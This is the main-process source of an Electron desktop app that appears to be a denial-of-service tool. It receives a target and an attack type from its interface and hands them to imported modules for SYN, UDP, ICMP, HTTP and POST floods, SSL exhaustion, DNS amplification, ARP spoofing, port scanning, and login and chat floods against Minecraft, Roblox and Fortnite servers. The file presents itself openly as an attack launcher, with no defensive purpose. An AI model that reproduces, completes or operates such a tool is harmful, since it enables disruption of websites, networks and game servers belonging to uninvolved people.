const { app, BrowserWindow } = require('electron');
const path = require('path');

function createWindow() {
    const mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            preload: path.join(__dirname, 'preload.js'),
            nodeIntegration: true,
            contextIsolation: false,
        },
    });

    mainWindow.loadFile('index.html');
}

const { ipcMain } = require('electron');

app.whenReady().then(() => {
    createWindow();

    ipcMain.on('start-attack', (event, args) => {
        const { target, attackType, rateLimit } = args;
        startAttack(target, attackType, rateLimit);
    });

    app.on('activate', function () {
        if (BrowserWindow.getAllWindows().length === 0) createWindow();
    });
});

app.on('window-all-closed', function () {
    if (process.platform !== 'darwin') app.quit();
});

const mineflayer = require('mineflayer');
const dgram = require('dgram');
const { exec } = require('child_process');
const httpFlood = require('./attacks/web/http_flood');
const httpsFlood = require('./attacks/web/https_flood');
const postFlood = require('./attacks/web/post_flood');
const sslExhaustion = require('./attacks/web/ssl_exhaustion');
const dnsAmplification = require('./attacks/web/dns_amplification');
const synFlood = require('./attacks/network/syn_flood');
const udpFlood = require('./attacks/network/udp_flood');
const icmpFlood = require('./attacks/network/icmp_flood');
const portScan = require('./attacks/network/port_scan');
const arpSpoofing = require('./attacks/network/arp_spoofing');
const minecraftLoginFlood = require('./attacks/games/minecraft_login_flood');
const minecraftChatFlood = require('./attacks/games/minecraft_chat_flood');
const robloxLoginFlood = require('./attacks/games/roblox_login_flood');
const robloxChatFlood = require('./attacks/games/roblox_chat_flood');
const fortniteLoginFlood = require('./attacks/games/fortnite_login_flood');
const fortniteChatFlood = require('./attacks/games/fortnite_chat_flood');

function startAttack(target, attackType, rateLimit) {
    const net = require('net');
    const http = require('http');
    const https = require('https');

    function logOutput(message) {
        const mainWindow = BrowserWindow.getAllWindows()[0];
        mainWindow.webContents.send('attack-output', message);
    }

    switch (attackType) {
        case 'syn':
            synFlood(target, rateLimit, logOutput);
            break;
        case 'udp':
            udpFlood(target, rateLimit, logOutput);
            break;
        case 'http':
            httpFlood(target, rateLimit, logOutput);
            break;
        case 'https':
            httpsFlood(target, rateLimit, logOutput);
            break;
        case 'post':
            postFlood(target, rateLimit, logOutput);
            break;
        case 'ssl_exhaustion':
            sslExhaustion(target, rateLimit, logOutput);
            break;
        case 'minecraft_login':
            minecraftLoginFlood(target, rateLimit, logOutput);
            break;
        case 'minecraft_chat':
            minecraftChatFlood(target, rateLimit, logOutput);
            break;
        case 'roblox_login':
            robloxLoginFlood(target, rateLimit, logOutput);
            break;
        case 'roblox_chat':
            robloxChatFlood(target, rateLimit, logOutput);
            break;
        case 'fortnite_login':
            fortniteLoginFlood(target, rateLimit, logOutput);
            break;
        case 'fortnite_chat':
            fortniteChatFlood(target, rateLimit, logOutput);
            break;
        case 'icmp':
            icmpFlood(target, rateLimit, logOutput);
            break;
        case 'dns_amplification':
            dnsAmplification(target, rateLimit, logOutput);
            break;
        case 'port_scan':
            portScan(target, rateLimit, logOutput);
            break;
        case 'arp_spoofing':
            arpSpoofing(target, rateLimit, logOutput);
            break;
        default:
            console.error('Invalid attack type');
    }
}
